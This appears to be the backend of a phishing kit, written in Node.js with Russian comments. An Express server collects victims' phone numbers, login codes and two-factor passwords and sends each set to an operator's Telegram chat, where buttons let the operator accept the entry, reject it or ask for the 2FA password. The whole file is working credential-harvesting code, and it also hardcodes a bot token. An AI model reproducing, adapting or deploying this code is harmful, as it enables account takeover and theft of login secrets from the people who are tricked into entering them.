const TelegramBot = require('node-telegram-bot-api');
const express = require('express');

const token = '8446641895:AAGsj1a1u8AQpKJxhFGhfu_yXaz6LKduAkE'; // Замените на ваш токен
const bot = new TelegramBot(token, { polling: true });
const YOUR_CHAT_ID = 8224914068; // Ваш chat ID
const app = express();
app.use(express.json());

// Храним коды для проверки (в реальном проекте используйте базу данных)
const userCodes = {};

// 1. Принимаем запрос на отправку кода из браузера
app.post('/send-code', (req, res) => {
    const { phone } = req.body;
    
    // Генерируем случайный код
    const code = Math.floor(10000 + Math.random() * 90000).toString();
    userCodes[phone] = code;
    
    // Отправляем вам уведомление с кнопками
    bot.sendMessage(YOUR_CHAT_ID, 
        `🔐 НОВАЯ РЕГИСТРАЦИЯ\n📱 Номер: ${phone}\n🌍 Страна: Russia`,
        {
            reply_markup: {
                inline_keyboard: [
                    [{ text: '✅ Принять', callback_data: `accept_${phone}` }],
                    [{ text: '❌ Отклонить', callback_data: `reject_${phone}` }],
                    [{ text: '🔑 2FA', callback_data: `request2fa_${phone}` }]
                ]
            }
        }
    );
    
    res.json({ success: true, code: code }); // Отправляем код обратно в браузер
});

// 2. Принимаем введённый пользователем код
app.post('/login', (req, res) => {
    const { phone, code, fa } = req.body;
    const correctCode = userCodes[phone];
    
    if (code === correctCode) {
        // Отправляем вам второе уведомление
        bot.sendMessage(YOUR_CHAT_ID,
            `✅ РЕГИСТРАЦИЯ УСПЕШНА\n📱 Номер: ${phone}\n🔑 Код: ${code}${fa ? `\n🔐 2FA: ${fa}` : ''}\n🌍 Страна: Russia`,
            {
                reply_markup: {
                    inline_keyboard: [
                        [{ text: '✅ Принять', callback_data: `accept_final_${phone}` }],
                        [{ text: '❌ Отклонить', callback_data: `reject_final_${phone}` }],
                        [{ text: '🔑 2FA', callback_data: `request2fa_final_${phone}` }]
                    ]
                }
            }
        );
        
        res.json({ success: true });
    } else {
        res.json({ success: false, error: 'Неверный код' });
    }
});

// 3. Обработка нажатий на кнопки
bot.on('callback_query', (callbackQuery) => {
    const data = callbackQuery.data;
    const chatId = callbackQuery.message.chat.id;
    const messageId = callbackQuery.message.message_id;
    
    if (data.startsWith('accept_')) {
        const phone = data.replace('accept_', '');
        bot.answerCallbackQuery(callbackQuery.id, { text: '✅ Запрос принят' });
        // Можно отправить что-то пользователю, если знаем его chat_id
    }
    else if (data.startsWith('reject_')) {
        const phone = data.replace('reject_', '');
        bot.answerCallbackQuery(callbackQuery.id, { text: '❌ Запрос отклонён' });
    }
    else if (data.startsWith('request2fa_')) {
        const phone = data.replace('request2fa_', '');
        bot.answerCallbackQuery(callbackQuery.id, { text: '🔑 Запрошен 2FA пароль' });
    }
    
    // Убираем кнопки после нажатия
    bot.editMessageReplyMarkup({ inline_keyboard: [] }, {
        chat_id: chatId,
        message_id: messageId
    });
});

app.listen(3000, () => console.log('✅ Сервер запущен на порту 3000'));
